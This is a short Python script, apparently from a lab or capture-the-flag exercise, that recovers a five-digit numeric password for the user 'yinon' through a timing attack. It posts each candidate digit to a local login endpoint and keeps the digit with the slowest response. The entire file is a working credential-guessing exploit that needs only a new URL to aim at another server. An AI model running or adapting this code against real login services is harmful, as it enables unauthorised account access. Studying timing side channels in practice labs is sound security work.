import requests
import time
password=""
for i in range(5):
    min_time=[]
    for j in range(10):
        print(f"current password is {password} and current letter is {j}")
        start = time.time()
        response = requests.post("http://127.0.0.1:8005/pass", data=f"uname=yinon&psw={password}{j}")
        end = time.time()
        min_time.append(end - start)
    index=min_time.index(max(min_time))
    print(f"current letter is {index}")
    password+=str(index)
print(f"password is {password}")